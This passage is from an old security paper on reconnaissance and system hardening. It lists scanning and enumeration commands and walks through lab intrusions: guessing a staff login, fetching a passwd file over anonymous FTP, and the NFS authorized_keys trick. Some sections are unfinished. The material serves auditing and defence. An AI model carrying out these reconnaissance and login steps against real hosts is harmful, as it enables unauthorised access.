should be taken very serious. This is a specially large concern when writing
servers, any type of security programs, or programs that are suid root, or
designed to be run by root, any special accounts, or the system itself. Apply
bounds checking (strn*, sn*, functions instead of sprintf etc.), prefer
allocating buffers of a dynamic, input-dependent, size, be careful on
for/while/etc. loops that gather data and stuff it into a buffer, and generally
handle user input with very much care are the main principles I suggest.

There has also been made notable effort of the security industry to prevent
overflow problems with techniques like non-executable stack, suid wrappers,
guard programs that check return addresses, bounds checking compilers, and so
on. You should make use of those techniques where possible, but do not fully
rely on them. Do not assume to be safe at all if you run a vanilla two-year old
UNIX distribution without updates, but overflow protection or (even more stupid)
firewalling/IDS. It cannot assure security, if you continue to use insecure
programs because _all_ security programs are _software_ and can contain
vulnerabilities themselves, or at least not be perfect. If you apply frequent
updates _and_ security measures, you can still not expect to be secure, _but_
you can hope. :-)

===================[What You Don't Know Will Hurt You]===================
===================[     by Larry W. Cashdollar      ]===================



I. Overview

   The first stage to a successful network attack is the information gathering
stage.  The attacker will collect as much information possible on the target
host in order to generate a vulnerability list.  Relevant to this list will be
OS type, OS version, services, service daemon versions, network
topology*,network equipment, firewalls, intrusion detection sensors etc..  The
purpose of this document is to outline two models of information gathering . 
The first model is "noisy" where the attacker uses all known resources with
little reguard for what footprints* might be left on the target.  The second is
"stealthy". Wherein the attacker uses methods and packages designed to subvert
logging facilities on the target.  This approach minimizes administrator
awareness and accountability.  I will examine a few systems, ranging from
Solaris 2.x Sparc systems to Linux/i386 architectures. I will then discuss how
we can harden a system to minimize information leakage.
  
II. Utilities and Packages

    The utilities we will use can can range from some common system commands to
network information gathering packages like nmap. I will list a few below and
give a brief description of each.  In the resources section you will find sites
and security indexes where search engines can dig up a myriad of network
security tools.  These are just a few.
  
            System Utilities. 
  
Utility Description finger Displays user information or current users logged
into specified host rusers Same as finger but in more detail showmount Displays
directories available for mounting via NFS.  rpcinfo Makes a call to rpc server
and displays information gathered.  dig DNS information gathering tool. Very
useful.  whois internic database lookup program.  snmpwalk Gather network
information using the SNMP protocol.  traceroute Show packet path to target
host.  nslookup Convert ip address to conical and visa versa mail bounce Use a
bogus recipient to gain information on a target host.


            Tool packages
  
Tool Description netgrep Netgrep scans an ip range for one specific port.  sscan
Scans multiple vulnerabilities and also uses host gathering techniques.  nmap
Stealth port scanner with stack fingerprinting ability and source spoofing
techniques, does xmas,syn,fin and UDP scans.  mscan older version of sscan,
still kind of fun.  NSS Narrow Security scanner its a perl script which makes it
nice and portable.  Searches for common vulnerabilities like msadc.pl and
showcode.asp.  I found it works very well.  CIS Cerebrus internet scanner nessus
Nessus is a security auditing program that can scan an entire class A subnet for
multiple DoS attacks,exploits and mis-configurations.  It runs in to parts a
client and server type application is used where all scanning functions are done
by the server which are controlled by the client. Nessus scans for many modern
security issues such as Windows vulnerabilities and various Unix exploits. 


              Common services.


Service Description SSH Secure Shell an interactive encrypted shell session like
telnet.  NFS Network File System allow file systems to be exported across the
network and mounted on a remote system.  rlogin/rsh/rexec Remote login / Remote
shell / Remote execute finger Display remote user information and current users
logged in.  FTP File transfer protocol, transfer binary and ASCII files between
hosts.  sendmail Mail delivery system between hosts.  WWW World Wide Web a.k.a
Hyper Text Tranport Protocol. You are looking at it now.  netbios Protocol that
allows MS networked machines to share resources.  DNS Domain Name Service, used
to resolve IP addresses to conical names and vise versa.  telnet Start an
interactive shell on a remote host using the TELNET protocol.  QPOP Pop your
email off the server to read off-line.  portmap Maps sun rpc services to their
respective ports (UDP)


  III. Information

    Just about any information on a target host is useful in creating a database
of applicable vulnerabilities. What we are attempting to do is determine what
services the target offers and if any of them can be exploited to leverage
access to the system. For example knowing the version of the OS that your target
host is using can help you find information on exploits or bugs specific to that
OS.  By limiting what services we are running and what information is available
we decrease the window of opportunity for the cracker.

IV. Information Gathering (Noisy)

    Just about all of the utilities mentioned above will disclose information
     about the target host. You can piece together parts of a targets network
     topology by bouncing a bad email off of the server. This can disclose a
     weather the mail is relayed internally on another host and the type and
     version of software used to handle internet/exchanged mail.  Using
     traceroute you can discover network equipment like routers and switches. 
     Portsan will give you a list of services available on the target host. 
     These are all common methods adopted by system crackers to gain access to
     their target.  Their are many packages out there that automate this process
     of poking, gathering, logging and sorting.  For example Sscan is a utility
     for crackers and system admins to gather information on target hosts
     machines also. It scans the host or network for various security problems
     and checks for vulnerabilities. Nessus is another package that scans a
     network for problems as it also checks for DoS attacks and poorly
     configured network equipment like routers and manageable hubs.  Just
     grabbing banners with telnet or netcat will divulge important information
     on your target. All of this is fine, but what about more sinister methods
     of information gathering? What about using information you meant to provide
     being used against you?  What about the stuff your logs don't catch?

V. Information Gathering (Stealth)

    This method uses the common public ports and specially designed utilities to
gather host, user and system information. When I talk about common public ports
I am referring to ports that are expected to be accessed by the everyday
internet user (53*, 80, 25 , 21*). These services can be queried with little or
no suspicion of the administrator. Some ports have varying degrees of
noticeably, for example if you do a zone transfer of the target systems dns
records. This may set off alarms that suspicious activity is at hand, perhaps
more so then an anonymous ftp connection depending on the site and
administrators awareness.

    These stealth utilities like nmap are designed to take advantage of the tcp
protocol in order to circumvent logging.  This can also be combined with
protocols that are less common like snmp. An SNMP query can yield information
like OS type, uptime and machine name*.  Quite a few vendors enable SNMP by
default and most administrators are unaware of the dangers. More common services
for example anonymous ftp can be mined for information. It is amazing what one
can find dumped in /pub on some sites, password files, old sensitive emails,
product information, system information and user lists.  I once found a Netscape
Enterprise Digital Certificate for the site I was auditing sitting in /pub
waiting for its owner to pick it up*.  In cases like this attacker simply
downloads every readable file hoping to find something interesting.

    Probably the number one reason to drive system admins to place closed
networks on to the internet is the desire to implement a web site. In some cases
the mad dash to get a web page up shoves proper security techniques aside. The
old saying don't put all of your eggs in one basket applies to security as well,
anyway back to the mad dash. This usually means that the hosting company will go
through great lengths to provide a myriad of information to the WWW community.
This can be a bad thing however, sometimes more information is too much
information.

VI. Procedures

        This is an overview of how to use each package.  For more information
see the man pages or the package documentation.
  
  

Package Description brscan Broadscan is very simple to use, I plan to add more
options to it later.  The following will search the given ip range for port 80. 
$ ./brscan 192.168.2.1 192.168.3.254 80
 
smbclient List all shares on WWW, type smbclient for more information on options
and usage.  $lab-1> smbclient -L WWW -I 192.168.2.3
 
whois $ whois whitehouse.gov@whois.arin.net traceroute $ traceroute
www.freebsd.org dig $ dig maine.edu @192.168.172.123 axfr snmpwalk Use snmpwalk
to query the snmp server on a remote host.  This protocol is probably less
commonly thought of as an information gathering tool.  It is a powerful one
however.  $lab-1> snmpwalk 192.168.2.3 public system
 
nss Narrow Security Scanner.  hostfiles is file containing a list of ip
addresses that you are scanning.

./scanner  hostfiles vulnerable-log
 
Nessus Nessus is a security auditing program that can scan an entire class A
subnet for multiple DoS attacks, exploits and mis-configurations.  It runs in to
parts a client and server type application is used where all scanning functions
are done by the server which are controlled by the client. Nessus scans for many
modern security issues such as Windows vulnerabilities and various Unix
exploits.  The command is as follows:  # ./nessusd & # ./nessus &

must issue an xhost command on connecting host.
 
rpcinfo Display information on remote procedures being offered.  $ rpcinfo -p
hostname
 
showmount Display information on remote NFS mounts.  $ showmount -e hostname
 
mail bounce An attempt to gather information on a remote host by bouncing a bad
email off of the server and examining the header information.  $ mail -s"test"
jkhshjkd@hostname.com test message please ignore
.  
 
 
nmap This is a network mapping package that is capable of stealth scanning and
OS finger printing.  I will attempt to explain these concepts to those of you
who are unfamiliar with them.  Stealth scanning: A normal TCP connection
consists of a 3 way hand shake in order to connect to the other host, this
software doesn't complete that 3 way hand shake in order to hide its attempts at
information gathering. 

OS finger printing: Mangled packets are sent in different sequences at the
target host and depending on the target hosts reaction a guess is made as to
what that host is running for an OS based on a table of known reactions. 

# ./nmap -O -sS 192.168.0.*
 
 
sscan Sscan is a rewrite of mscan. They are vulerability scanning tools that are
capable of scanning a large block of ip addresses searching for known
vulnerabilities like, Qpop, IMAP, DNS, cgi-bin/phf etc.  # ./sscan -o
192.168.3.28
 

VII. Locking down the house Shut down all unneeded services.  Remove all
 unwanted packages.  Web server? don't need X, GCC, Sendmail etc... Mail server?
 don't need apache, GNOME, GCC etc...  Look through vulnerability archives like
 packetstorm for existing exploits.  Search for your
 OS/Software/Services/Packages etc.. Patch accordingly.  Audit your setuid
 binaries. find / -perm -4000 > setuid-DATESTAMP store this off-line somewhere. 
 Install tripwire but don't rely on this alone.  Watch your logs keep a close
 eye on the system as a whole.  Mount certain partitions Read only like /usr. 
 Under linux you can do a mount /dev/hda2 /usr remount,ro see the man page for
 more details.  Join Email lists like CERT, CIAC,Bugtraq and lists specific to
 your vendors.  Limit local accounts to root and a manager account.  Passwords
 really secure passwords.  Something you can pronounce so you can remember it,
 but with no real words. minimum of 7 characters. Rudi^b@1 -->>> Rudy Carrot bat
 one.  Limit services, don't run tons of plugs and proxies on your firewall.  It
 soon becomes a proxy server once you add that AOL IM Proxy, Real audio and
 NNTP.  Use filtering either tcp wrappers or like linux and freeBSD you can use
 ipchains and ipfw to drop unwanted packets.  try to break into your own
 network.  BUT make sure you have permission in writing, and notify networking
 personnel and management.  This could even cause them to secure the boxes
 before hand.  Which will not give an accurate security assessment but at least
 it moved you in the right direction.  Always maintain patch levels and version
 levels of your services, like bind and sendmail.  Only allow zone transfers and
 queries by your network and its trusted hosts (i.e. secondary DNS).  VIII.
 Interpretation and Sorting

This section is still being completed.  In this section I have examples of
output from various packages and I will point out significant tid bits of
information.  These are actual logs of what information I was able to find on
some test systems.  My comments are in red.

We now know of one login on our target www which sometimes has easy to guess

    If a service is vital to your server be sure and get information on previous
bugs and patches.  Getting the latest version isnt always the answer as new
features might introduce new bugs its better to keep track of the latest
modifications to the new version and upgrade accordingly.  For example if their
are no known vulnerabilies and the latest version adds more bells and whistles
you might want to wait a while before upgrading.  This way the software package
has time to be poked and prodded by system administrators and security
personnel.

    Enough dry reading already lets see how much information we can gather on
our target with these tools. Our target is a High School web server. The box is
hosted by the school off of a state edu connection. The box is actually one of
my lab machines that I configured in the same exact way the server I audited
was. All of the examples in this paper will be lab machines setup to depict
examples as I have seen them in the wild.

Nmap Scan:  For usage see the tools section.

[root@Diabolic nmap-2.3BETA6]# ./nmap -O -sX 192.168.15.19

Starting nmap V. 2.3BETA6 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
Interesting ports on dt065ndb.maine.rr.com (192.168.15.19):

Port State Protocol Service 23 open tcp telnet 25 open tcp smtp 80 open tcp http
TCP Sequence Prediction: Class=truly random Difficulty=9999999 (Good luck!)
Remote operating system guess: Linux 2.0.35-37

Nmap run completed -- 1 IP address (1 host up) scanned in 4 seconds

Our target host is running a web server and telnet for remote administration.
They probably feel that the server is somewhat secure because they have shutdown
most of the services. The next step is to fire up a web browser and see what
they have for site content. &lt;screen dump?>

What I am looking for is any information that will get me what accounts exist on
the target and whom they belong to. I find to be what I consider half of the
password file HTMLized and up for display, a contact page. I don't really know
if the accounts on the contact page are local or alias to a mail server
internally. I assume its all local accounts as most school admins aren't ready
to setup a split horizon DNS with a smart relaying sendmail configuration.

The contact page is generally a list of email addresses for that site of about
ten to fifteen teachers, staff and even the webmaster. I guess that the
principals secretary might be a good candidate for a password guessing attack
and try the following.

Trying 192.168.15.19...  Connected to 192.168.15.19.  Escape character is '^]'.

Red Hat Linux release 5.2 (Apollo) Kernel 2.0.36 on an i486 login: jsmith
Password:jsmith&lt;enter> [jsmith@dt065ndb jsmith]$

Woops, they are local accounts and poorly passworded as I suspected. As nmap
revealed this is a linux box. Redhat 5.2 to be specific and trivial to locate an
exploit to get root. At this stage the game is all over. With minimal
information gathering, nmap scan and web mining we were able to gain access to
our target. If they had mail handled elsewhere, limited local accounts to root
and 1 admin user with good passwords this wouldn't have happened. (entries in
hosts.allow/deny wouldn't have killed them either)

More electronic dumpster diving with ftp.

[pangea /tmp] $ ftp 192.168.41.29

Connected to zig.internal.net.  220 zig FTP server (UNIX(r) System V Release
4.0) ready.  Name (zig.internal.net:security): anonymous 331 Guest login ok,
send ident as password.  Password:  230 Guest login ok, access restrictions
apply.  ftp> cd etc 250 CWD command successful.  ftp> get passwd 200 PORT
command successful.  150 ASCII data connection for passwd (192.168.12.2,33793)
(523 bytes).  226 ASCII Transfer complete.  local: passwd remote: passwd 538
bytes received in 0.0059 seconds (89 Kbytes/s)

Ok, grabbing the password file isnt so steathly.  But I want to check to see if
they screwed up at all.

$> tail -n1 passwd ftpadm:x:1113:1000::/home/ftpadm:/bin/csh

Yes, they have screwed up this is possibly (if the passwd file is not out of
date) a local user account with a vaild shell.

[muffin /tmp] $ ftp 192.168.41.29

Connected to zig.internal.net.  220 zig FTP server (UNIX(r) System V Release
4.0) ready.  Name (zig.internal.net:security): ftpadm 331 Password required for
ftpadm.  Password: (ftpadm1) 230 User ftpadm logged in.  ftp>

First try.  Probably the second worst password you could have besides ftpadm. 
Dangerous combinations

SSH and NFS, if you are exporting a home directory to the world which is a big
no-no an attacker can append their identity.pub file in your authorized_keys
file.  This will allow them to login with their login password.  You really
shouldnt need to export a file system off of a system on the internet.  I would
move the NFS server into the internal network and share out the filesystem to s
specific list of hosts or networks. Also besides clamping down on NFS add tcp
wrappers to your SSH daemon, it can be run from inetd with sshd's -i option. 
WWW with telnet/ssh.  Be sure if you list contacts and email addresses that none
of them reside locally on the web server.  If they do then you just gave out
half of your password file. A list of contacts is a list of logins.  An
anonymous ftp site with write able directories and / or sensitive material. This
is becomes an electronic form of dumpster diving.  Old emails, software
packages, sensitive files etc..  snmp and samba, snmp can be used to get the
netbios/machine name.  Then samba can be probed for shares.  Sharing an
uploadable ftp directory with a webserver. Scripts can be uploaded and executed
remotely through the webserver. (PHP,ASP,PERL,SHTML etc..) Sorting /
Organization Logs are normally kept in flat text files, this make them easy to
manage and sort. Depending on how savvy you are you might want to create
database or store them in comma delimited format. I organize log files using the
following directory structure.  Network -----> Hostname -----> nmap_output
-----> showmount -e output -----> snmpwalk_output ..etc..
  

I suggest logging problems by network, OS, Vulnerability,hostname.

                                    192.168.0 ------> IRIX
                                                      ------>
                                                             open_lp_account
                                                             192.168.0.23
                                                             192.168.0.64
                                                             192.168.0.203

                  This way with each directory change you get more detail.
